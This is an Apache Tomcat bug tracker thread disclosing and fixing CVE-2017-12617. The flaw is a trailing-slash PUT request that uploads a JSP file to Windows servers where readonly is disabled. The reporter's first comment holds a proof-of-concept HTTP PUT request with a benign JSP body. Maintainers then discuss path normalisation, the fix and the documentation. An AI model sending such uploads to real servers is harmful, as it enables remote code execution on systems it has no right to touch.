[{"count": 0, "tags": [], "text": "Description:\nWhen running on Windows with HTTP PUTs enabled (e.g. via setting the\nreadonly initialisation parameter of the Default to false) it was\npossible to upload a JSP file to the server via a specially crafted\nrequest. This JSP could then be requested and any code it contained\nwould be executed by the server.\n\nthe poc is like this:\nPUT /1.jsp/ HTTP/1.1\nHost: 192.168.3.103:8080\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nReferer: http://192.168.3.103:8080/examples/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2\nCookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94\nConnection: close\nContent-Length: 26\n\n<% out.println(\"hello\");%>\n\nit is the bypass for CVE-2017-12615", "is_private": false, "id": 200986, "creation_time": "2017-09-20T06:38:18Z", "time": "2017-09-20T06:38:18Z", "creator": "shengqi158@gmail.com", "bug_id": 61542, "attachment_id": null}, {"count": 1, "attachment_id": null, "creator": "markt@apache.org", "is_private": false, "id": 201000, "time": "2017-09-20T12:06:16Z", "bug_id": 61542, "creation_time": "2017-09-20T12:06:16Z", "tags": [], "text": "This additional issue has been confirmed and CVE-2017-12617 has been allocated."}, {"count": 2, "tags": [], "text": "Hum, actually this looks like a File API issue. With the (correct) /1.jsp/ path input, (new File(name)).getPath() just strips the trailing '/', and of course getAbsolutePath, which is used for the safety net check, also does it. There's a problem there.\n\nRestoring the BZ name since it's pointless.", "is_private": false, "id": 201002, "creation_time": "2017-09-20T12:37:35Z", "time": "2017-09-20T12:37:35Z", "creator": "remm@apache.org", "bug_id": 61542, "attachment_id": null}, {"count": 3, "attachment_id": null, "bug_id": 61542, "text": "The File API certainly isn't helping.\n\nWhen a file named '/test.jsp' exists '/test.jsp/' -> '/test.jsp' is surprising. Less so when it doesn't exist because it could be referring to a directory and both forms are valid for a directory.", "id": 201003, "time": "2017-09-20T13:03:16Z", "creator": "markt@apache.org", "creation_time": "2017-09-20T13:03:16Z", "tags": [], "is_private": false}, {"count": 4, "tags": [], "text": "Well, every time there's surprising normalization, it causes security issues so it's a big API mistake :) The normalization of the input path should only happen for getCanonicalPath, that's the whole point.\n\nOf course, I probably knew about this behavior a while ago then since there's the '/' check for get. On the plus side the issue is not that serious (readonly needed) so it's not the end of the world.", "is_private": false, "id": 201006, "creator": "remm@apache.org", "time": "2017-09-20T13:17:28Z", "bug_id": 61542, "creation_time": "2017-09-20T13:17:28Z", "attachment_id": null}, {"count": 5, "tags": [], "text": "Maybe a better check would be that, given the path will already have been normalised, if the the absolute path ends with the given name.", "is_private": false, "id": 201008, "creation_time": "2017-09-20T15:34:39Z", "time": "2017-09-20T15:34:39Z", "creator": "markt@apache.org", "bug_id": 61542, "attachment_id": null}, {"count": 6, "tags": [], "creator": "markt@apache.org", "text": "Nope. That will fail for directories where the trailing '/' is provided since it will have been removed from the absolute and canonical paths.", "id": 201009, "time": "2017-09-20T15:58:33Z", "bug_id": 61542, "creation_time": "2017-09-20T15:58:33Z", "is_private": false, "attachment_id": null}, {"count": 7, "tags": [], "bug_id": 61542, "attachment_id": null, "is_private": false, "id": 201070, "time": "2017-09-22T08:02:14Z", "creator": "peter.stockli@alphabot.com", "creation_time": "2017-09-22T08:02:14Z", "text": "Isn't the mere existence of the readonly parameter also part of the problem?\n\nhttps://tomcat.apache.org/tomcat-7.0-doc/default-servlet.html\nIt is currently documented as \"Is this context \"read only\", so HTTP commands like PUT and DELETE are rejected? [true]\"\n\nBut it holds more \"surprises\". IMHO this parameter should NEVER be set to false. Maybe it can be removed or the documentation of this parameter can be improved?"}, {"count": 8, "attachment_id": null, "bug_id": 61542, "text": "(In reply to Peter St\u00f6ckli from comment #7)\n> Isn't the mere existence of the readonly parameter also part of the problem?\n> \n> https://tomcat.apache.org/tomcat-7.0-doc/default-servlet.html\n> It is currently documented as \"Is this context \"read only\", so HTTP commands\n> like PUT and DELETE are rejected? [true]\"\n> \n> But it holds more \"surprises\". IMHO this parameter should NEVER be set to\n> false. Maybe it can be removed or the documentation of this parameter can be\n> improved?\n\nHave you ever heard of WebDAV ? Obviously if we were writing Tomcat today, we would never bother implementing it. Also obviously, nobody running a public server should enable it, secured or not. But it's not going to be removed either.", "id": 201074, "time": "2017-09-22T09:20:33Z", "creator": "remm@apache.org", "creation_time": "2017-09-22T09:20:33Z", "tags": [], "is_private": false}, {"count": 9, "tags": [], "bug_id": 61542, "attachment_id": null, "text": "Indeed. Lots of folks run Tomcat with WebDAV on internal sites. Hard-coding readonly to true is simply not an option.\n\nRegarding better documentation, patches welcome.", "id": 201075, "time": "2017-09-22T09:23:09Z", "creator": "markt@apache.org", "creation_time": "2017-09-22T09:23:09Z", "is_private": false}, {"count": 10, "tags": [], "bug_id": 61542, "attachment_id": 35361, "is_private": false, "id": 201078, "time": "2017-09-22T11:20:52Z", "creator": "peter.stockli@alphabot.com", "creation_time": "2017-09-22T11:20:52Z", "text": "Created attachment 35361\nproposal to improve doc of the readonly flag\n\nFirst of all: your work is greatly appreciated!\nAnd I didn't know that Tomcat is also widely used as WebDAV server. So it makes sense to keep that option.\n\nAttached is a patch that could help improve the documentation of the readonly flag."}, {"count": 11, "tags": [], "bug_id": 61542, "attachment_id": null, "text": "Fixed in:\n- trunk for 9.0.0 onwards\n- 8.5.x for 8.5.22 onwards\n- 8.0.x for 8.0.47 onwards\n- 7.0.x for 7.0.82 onwards\n\nI'm on the fence regarding the suggested documentation change. If a sysadmin doesn't understand what enabling HTTP PUT and/or DELETE means I don't think any realistic amount of documentation is going to result in a correctly secured Tomcat instance.\n\nMaybe what we need is a link to the security page from every setting called out in the security page. Something to ponder / discuss on the dev@ list.", "id": 201087, "time": "2017-09-22T14:13:30Z", "creator": "markt@apache.org", "creation_time": "2017-09-22T14:13:30Z", "is_private": false}]